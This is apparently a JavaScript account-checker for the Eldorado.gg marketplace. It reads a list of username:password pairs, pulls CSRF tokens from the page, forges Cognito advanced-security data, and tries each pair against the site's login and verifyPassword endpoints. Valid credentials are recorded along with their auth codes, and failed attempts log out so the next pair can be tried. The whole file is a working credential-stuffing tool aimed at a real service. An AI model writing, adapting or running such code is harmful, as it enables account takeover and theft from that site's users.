// login.js — Eldorado login + verifyPassword flow
// Dependencies: logger.js, pkce.js, cognito.js
// Values injected by Python:
//   __ACCOUNTS_JSON__   -> JSON string (account list)
//   __CURRENT_INDEX__   -> integer (current account index)

(async () => {
    const ACCOUNTS_LIST = __ACCOUNTS_JSON__;
    const CLIENT_ID = "3a4hal6jgl8gf5hnnjo06k05s5";
    const STATE = "XbANFvjOIGeUrUsY7d4WXUpJ5f8E1CPV";

    // --- Parse account list ---
    const accounts = ACCOUNTS_LIST
        .map(line => line.trim())
        .filter(line => line.includes(":"))
        .map(line => {
            const colonIdx = line.indexOf(":");
            const username = line.substring(0, colonIdx).trim();
            const password = line.substring(colonIdx + 1).trim();
            return { username, password };
        });

    if (accounts.length === 0) {
        console.error("[ERROR] No valid accounts found. Please check your accounts file.");
        window._script_finished = true;
        return;
    }

    const currentIndex = __CURRENT_INDEX__;

    if (currentIndex >= accounts.length) {
        console.log("[DONE] All accounts scanned.");
        window._script_finished = true;
        return;
    }

    const { username: USERNAME, password: PASSWORD } = accounts[currentIndex];
    console.log(`[+] Scanning (${currentIndex + 1}/${accounts.length}): ${USERNAME}`);

    // --- Read CSRF token ---
    const getCsrfToken = () => {
        let csrfVal = "";
        const match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
        if (match) {
            try {
                const decoded = JSON.parse(atob(decodeURIComponent(match[1]).split('.')[1] || "{}"));
                if (decoded["XSRF-TOKEN"]) csrfVal = decoded["XSRF-TOKEN"];
            } catch (e) {}
        }
        if (!csrfVal) {
            const csrfInput = document.querySelector('input[name="csrf"]') || document.querySelector('meta[name="csrf-token"]');
            if (csrfInput) csrfVal = csrfInput.value || csrfInput.content;
        }
        return csrfVal || "";
    };

    try {
        await new Promise(r => setTimeout(r, 500));

        // Generate PKCE pair
        const pkce = await generatePKCE();
        window._code_verifier = pkce.verifier;
        const CODE_CHALLENGE = pkce.challenge;

        const BASE_PARAMS = `redirect_uri=https%3A%2F%2Fwww.eldorado.gg%2Faccount%2Fauth-callback&response_type=code&client_id=${CLIENT_ID}&identity_provider=COGNITO&scope=email+openid+profile+aws.cognito.signin.user.admin&state=${STATE}&code_challenge=${encodeURIComponent(CODE_CHALLENGE)}&code_challenge_method=S256&lang=en`;

        const CSRF_TOKEN = getCsrfToken();
        const CURRENT_COOKIES = document.cookie;

        // --- Step 1: Login request ---
        const loginCognitoToken = await generateCognitoAsfData(CLIENT_ID, USERNAME);
        const controller1 = new AbortController();
        const timeout1 = setTimeout(() => controller1.abort(), 8000);

        await fetch(`https://login.eldorado.gg/login?${BASE_PARAMS}&_data=routes%2Flogin`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://login.eldorado.gg',
                'Cookie': CURRENT_COOKIES
            },
            body: new URLSearchParams({
                'username': USERNAME,
                'csrf': CSRF_TOKEN,
                'cognitoAsfData': loginCognitoToken
            }),
            signal: controller1.signal
        });
        clearTimeout(timeout1);

        // --- Step 2: VerifyPassword request ---
        const updatedCookies = document.cookie;
        const updatedCsrf = getCsrfToken() || CSRF_TOKEN;
        const passwordCognitoToken = await generateCognitoAsfData(CLIENT_ID, "");

        const controller2 = new AbortController();
        const timeout2 = setTimeout(() => controller2.abort(), 8000);

        const verifyResponse = await fetch(`https://login.eldorado.gg/verifyPassword?${BASE_PARAMS}&_data=routes%2FverifyPassword`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://login.eldorado.gg',
                'Cookie': updatedCookies
            },
            body: new URLSearchParams({
                'password': PASSWORD,
                'csrf': updatedCsrf,
                'cognitoAsfData': passwordCognitoToken
            }),
            signal: controller2.signal
        });
        clearTimeout(timeout2);

        const contentType = verifyResponse.headers.get("content-type") || "";
        const responseData = contentType.includes("application/json")
            ? await verifyResponse.json()
            : await verifyResponse.text();
        const remixRedirect = verifyResponse.headers.get("x-remix-redirect");

        if (remixRedirect && remixRedirect.includes("auth-callback?code=")) {
            const codeMatch = remixRedirect.match(/[?&]code=([^&]+)/);
            const authCode = codeMatch ? codeMatch[1] : "";
            window._auth_code = authCode;
            console.log(`[SUCCESS] Account: ${USERNAME} | Password: ${PASSWORD}`);
            window._last_success = `${USERNAME}:${PASSWORD}`;
            window._wait_for_cookie_read = true;
            return;
        } else if (responseData && typeof responseData === 'object' && responseData.formError) {
            console.log(`[FAILED] Account: ${USERNAME} | Reason: ${responseData.formError}`);
        } else {
            console.log(`[UNKNOWN] Account: ${USERNAME}`);
        }

    } catch (err) {
        console.error(`[ERROR] Account: ${USERNAME} -> Request timed out or failed.`);
    }

    // Logout on failed/unknown result
    try {
        await fetch('https://login.eldorado.gg/logout?client_id=3a4hal6jgl8gf5hnnjo06k05s5&logout_uri=https%3A%2F%2Fwww.eldorado.gg%2F', {
            method: 'GET',
            credentials: 'include'
        });
    } catch (e) {}

    window._need_refresh = true;
})();
